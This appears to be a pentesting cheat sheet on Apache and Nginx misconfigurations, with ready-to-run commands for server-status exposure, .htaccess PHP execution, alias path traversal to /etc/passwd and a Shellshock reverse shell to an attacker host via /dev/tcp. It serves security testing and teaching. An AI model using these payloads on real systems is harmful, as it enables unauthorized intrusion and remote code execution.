# Apache / Nginx Misconfigs

**What it is:** The two most popular web servers on the internet. Apache serves ~30% and Nginx ~34% of all websites. Misconfigurations like exposed server-status, .htaccess abuse, alias traversal, and Shellshock are the main attack vectors.

**Default ports:** 80, 443, 8080

**Vuln research:**
- [Apache CVEs — CVE Details](https://www.cvedetails.com/product/66/Apache-Http-Server.html)
- [Nginx CVEs — CVE Details](https://www.cvedetails.com/product/17956/Nginx-Nginx.html)
- [SearchSploit: `searchsploit apache` / `searchsploit nginx`](https://www.exploit-db.com/)
- [HackTricks — Apache](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/apache.html)

---


### Apache server-status exposure

Reveals active connections and URLs — Information disclosure

```bash
curl http://$IP/server-status
curl http://$IP/server-info
```

---

### Apache .htaccess tricks

If you can upload .htaccess — Execute arbitrary extensions as PHP

```bash
# Upload .htaccess with:
AddType application/x-httpd-php .txt
# Now any .txt file executes as PHP
```

---

### Nginx alias traversal

Misconfigured alias directive — Path traversal to read files

```bash
# If config has: location /files { alias /var/www/files/; }
curl http://$IP/files../etc/passwd
```

---

### Apache mod_cgi shellshock (CVE-2014-6271)

RCE via CGI scripts — If /cgi-bin/ scripts exist

```bash
gobuster dir -u http://$IP/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/$LHOST/4444 0>&1" http://$IP/cgi-bin/script.sh
```

---

### Check for default pages and info

Quick info gathering on web servers

```bash
nikto -h http://$IP
# Check: /phpinfo.php, /info.php, /.git/, /.env
```

---
